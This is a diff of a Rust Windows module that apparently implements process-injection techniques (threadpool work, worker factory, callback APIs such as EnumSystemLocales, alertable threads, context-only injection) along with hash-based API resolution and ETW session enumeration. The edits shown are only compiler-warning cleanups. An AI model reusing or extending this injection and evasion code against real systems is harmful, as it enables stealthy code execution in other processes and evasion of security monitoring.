@@ -24,8 +24,7 @@
 
 #![cfg(windows)]
 
-use anyhow::{anyhow, Result};
-use rand::RngCore;
+use anyhow::Result;
 use rand::Rng;
 use std::ffi::c_void;
 
@@ -3148,9 +3147,9 @@ fn inject_threadpool_work(
         type TpPostWorkFn = unsafe extern "system" fn(*mut c_void);
         type TpReleaseWorkFn = unsafe extern "system" fn(*mut c_void);
 
-        let tp_alloc_work: TpAllocWorkFn = std::mem::transmute(tp_alloc_work_addr);
-        let tp_post_work: TpPostWorkFn = std::mem::transmute(tp_post_work_addr);
-        let tp_release_work: TpReleaseWorkFn = std::mem::transmute(tp_release_work_addr);
+        let _tp_alloc_work: TpAllocWorkFn = std::mem::transmute(tp_alloc_work_addr);
+        let _tp_post_work: TpPostWorkFn = std::mem::transmute(tp_post_work_addr);
+        let _tp_release_work: TpReleaseWorkFn = std::mem::transmute(tp_release_work_addr);
 
         // Build a small x86-64 stub that:
         //   1. Calls TpAllocWork(&local_work, payload_addr, NULL, NULL)
@@ -3327,7 +3326,7 @@ fn inject_threadpool_worker_factory(
             *mut u32,                         // ReturnLength
         ) -> i32;
 
-        let nt_query_wf: NtQueryInformationWorkerFactoryFn =
+        let _nt_query_wf: NtQueryInformationWorkerFactoryFn =
             std::mem::transmute(nt_query_wf_addr);
 
         // Build a stub that:
@@ -5215,7 +5214,7 @@ fn inject_callback_enum_system_locales(
 
         // BOOL EnumSystemLocalesA(LOCALE_ENUMPROCA lpLocaleEnumProc, DWORD dwFlags)
         // lpLocaleEnumProc = our stub address, dwFlags = 0 (enumerate all)
-        let enum_sys_locales: extern "system" fn(usize, u32) -> i32 =
+        let _enum_sys_locales: extern "system" fn(usize, u32) -> i32 =
             std::mem::transmute(enum_func);
 
         // The callback runs in the target process context. We invoke the API
@@ -5791,7 +5790,7 @@ fn inject_callback_enum_font_families(
         // We need a LOGFONT structure with lfFaceName[0]=0 (enumerate all).
         // LOGFONTW is 92 bytes on x64. We'll write it into the target process.
         // For simplicity, allocate 128 bytes and zero it (LOGFONTW with lfCharSet=DEFAULT_CHARSET).
-        let mut logfont = vec![0u8; 128];
+        let logfont = vec![0u8; 128];
         // lfCharSet at offset 23 = DEFAULT_CHARSET (1) — actually DEFAULT_CHARSET = 1
         // But 0 (ANSI_CHARSET) works too for "enumerate all fonts".
         // Let's set lfFaceName[0] = 0 and lfCharSet = 0 (already zeroed).
@@ -6178,7 +6177,7 @@ fn inject_callback_copy_file_ex(
         if h_file != 0 {
             // Write a single byte so the file is non-empty.
             let byte = [0x20u8; 1];
-            let mut written_local = 0usize;
+            let _written_local = 0usize;
             let _ = crate::emulated_syscall!(
                 "NtWriteFile",
                 h_file as u64,
@@ -6392,7 +6391,7 @@ fn page_align(size: usize) -> usize {
 /// to enumerate threads, then NtOpenThread + NtQueryInformationThread to
 /// check if the thread is alertable.
 unsafe fn find_alertable_thread(
-    h_proc: *mut c_void,
+    _h_proc: *mut c_void,
     pid: u32,
 ) -> Option<(*mut c_void, u32)> {
     use winapi::um::winnt::{THREAD_QUERY_INFORMATION, THREAD_SET_CONTEXT};
@@ -6415,7 +6414,7 @@ unsafe fn find_alertable_thread(
     let query_fn: NtQuerySystemInformationFn = std::mem::transmute(nt_query_info);
 
     // SystemProcessInformation = 5
-    let mut buf_size = 0x10000u32;
+    let buf_size = 0x10000u32;
     let mut buf: Vec<u8> = Vec::with_capacity(buf_size as usize);
     let mut ret_len = 0u32;
 
@@ -7104,7 +7103,7 @@ unsafe fn test_ntsetinfo_write_support() -> bool {
 
     // Prepare test data
     let test_bytes: [u8; 4] = [0xDE, 0xAD, 0xBE, 0xEF];
-    let mut bytes_written: usize = 0;
+    let _bytes_written: usize = 0;
     let layout = ProcessReadWriteVmLayout {
         target_address: base_addr,
         source_buffer: test_bytes.as_ptr() as usize,
@@ -7730,7 +7729,7 @@ fn inject_context_only(
 ) -> Result<InjectionHandle, InjectionError> {
     unsafe {
         // ── Step 0: Resolve NT API functions via pe_resolve ─────────────
-        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
+        let _ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
             .ok_or_else(|| InjectionError::InjectionFailed {
                 technique: InjectionTechnique::ContextOnly,
                 reason: "cannot resolve ntdll base".to_string(),
@@ -9586,7 +9585,7 @@ unsafe fn enumerate_autologger_sessions() -> Result<Vec<String>, String> {
             break;
         }
         let ntstatus = status.unwrap();
-        if ntstatus == 0x8000001A_i32 || ntstatus < 0 {
+        if ntstatus == 0x8000001A_u32 as i32 || ntstatus < 0 {
             break;
         }
 
